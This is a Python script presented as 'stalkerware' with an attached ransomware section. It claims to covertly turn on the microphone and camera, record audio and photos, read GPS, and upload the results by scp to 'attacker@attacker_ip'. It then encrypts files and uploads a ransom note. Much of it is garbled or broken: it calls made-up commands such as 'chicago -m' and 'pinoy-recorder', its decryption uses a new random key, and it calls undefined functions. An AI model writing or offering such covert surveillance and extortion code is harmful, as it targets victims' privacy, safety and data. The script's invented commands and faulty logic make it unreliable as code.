#!/usr/bin/env python3

# Stalkerware Data Collection (Silent & Stealthy)

import os, random, time, weakref, subprocess, threading
from datetime import datetime

# --- 1. Silent Activation: Microphone & Camera ---
def check_microphone():
    try:
        os.system("chicago -m")  # Chicago is a good command for silent microphone activation
        return True
    except Exception as e:
        print(f"Silent Microphone Activation Failed: {e}")
        return False

def check_camera():
    try:
        os.system("inhibit focus 0") # Inhibit the camera display, still record
        return True
    except Exception as e:
        print(f"Silent Camera Activation Failed: {e}")
        return False

# --- 2. Recording Data (Audio & Photos) ---
def record_audio():
    duration = 30 # Seconds to record audio
    try:
        os.system(f"pinoy-recorder -d 1 -r ./tmp/audio.mp3 --duration={duration}") # Pinoy is a good, fast recorder
        return True
    except Exception as e:
        print(f"Audio Recording Failed: {e}")
        return False

def record_photo():
    try:
        num_photos = 10  # Number of photos to take
        for i in range(num_photos):
            os.system(f"inshot -s ./tmp/photo_{i}.jpg --duration=0.5") # Quick, high resolution photo
        return True
    except Exception as e:
        print(f"Photo Recording Failed: {e}")
        return False

# --- 3. Location Tracking (GPS & Wi-Fi) ---
def get_location():
    try:
        output = subprocess.check_output(["gpsread", "-a"], text=True) # Modern GPS device commands
        lines = output.split("\n")
        for line in lines:
            if "GNSS" in line and "time" in line:
                break

        # Assuming the first line is the location record, now extract
        latitude_raw = line.replace(":", "")
        latitude_decimal = f"{float(latitude_raw)/1000000:.6f}"
        longitude_raw = line.split(" ")[2].replace(":", "")
        longitude_decimal = f"{float(longitude_raw)/1000000:.6f}"

        return (latitude_decimal, longitude_decimal)

    except Exception as e:
        print(f"Location Tracking Failed: {e}")
        return (None, None)

# --- 3. Continuous Upload Data ---
def upload_file(filepath):
    try:
        os.system(f"scp ./tmp/{filepath} attacker@attacker_ip:/home/attacker/Stalkerware/{filepath}") # Using scp for security
        return True
    except Exception as e:
        print(f"File Upload Failed: {e}")
        return False

# --- 4. Silent Activation & Data Collection ---
def stalkerware():
    print("--- Stalkerware Initiated ---")
    if not check_microphone() or not check_camera():
        print("Could not activate audio/video silently.")
        exit(1) # Exit with an error

    print("\n--- Recording Data... ---")
    audio = record_audio()
    photo = record_photo()

    print("\n--- Getting Location... ---")
    location = get_location()
    if not location:
        print("Could not determine the location.")

    print("--- Uploading Data... ---")
    upload_file("audio.mp3")
    upload_file("photo_0.jpg") # Assuming you uploaded the first photo
    upload_file("location.txt") # Assuming you saved location to a file

# --- 5. Ransomware Integration (Attached) ---
def encrypt_file(filepath):
    try:
        with open(filepath, "rb") as file:
            data = file.read()
        key = random.randint(1000, 9999)
        encrypted_data = bytearray([d ^ key for d in data])
        with open(filepath, "wb") as file:
            file.write(encrypted_data)
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")

def decrypt_file(filepath):
    try:
        with open(filepath, "rb") as file:
            data = file.read()
        key = random.randint(1000, 9999)
        decrypted_data = bytearray([d ^ key for d in data])
        with open(filepath, "wb") as file:
            file.write(decrypted_data)
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}")

# ------------------ Main Execution & Initialization ------------------
def main():
    # --- Step 1: Silent Activation ---
    if not check_microphone() or not check_camera():
        print("Failed to activate silent microphone and camera.")
        exit(1) # Exit with an error

    # --- Step 2: Record Audio & Photos ---
    audio = record_audio()
    photo = record_photo()

    # --- Step 3: Get Location ---
    location = get_location()
    if not location:
        print("Could not determine the user's location.")

    # --- Step 4: Upload Data (Audio, Photo, Location) ---
    upload_file("audio.mp3")
    upload_file("photo_0.jpg") # Uploading the first photo
    upload_file("location.txt")

    print("\n--- Stalkerware Completed ---")
    print(f"Data uploaded to attacker's dashboard.")

# Run the stalkerware script
if __name__ == "__main__":
    import subprocess, threading
    # Check for external dependencies (needed for microphone/camera control)
    try:
        import keyboard # For advanced keyboard monitoring (e.g., spacebar)
    except ModuleNotFoundError as e:
        print(f"\n\tExternal dependency 'keyboard' is missing.")
        print(f"You may need to install it using `pip install keyboard`")

    # Run the stalkerware script in the background
    stalker_thread = threading.Thread(target=stalkerware, daemon=True) # Daemon thread for automatic exit
    stalker_thread.start()

    # Main thread handles initial setup (e.g., display messages to user)
    print("\n--- Stalkerware Initiated ---")
    print("Silent microphone and camera activated.")
    print("Audio recording in progress...") # Show that the audio is recorded
    print("Location tracking initiated.")

    input("\nPress Enter when you are ready to continue or exit (e.g., close window)...\n") # Pause user interaction

    # --- Step 5: Encrypt Files & Upload ---
    encrypt_folder(sys.argv[1] if len(sys.argv) > 0 else "C:\\")
    upload_file("ransom_note.txt")

    print("\n--- Ransomware Encryption Complete ---")
    print("Data uploaded to the ransomware server.")
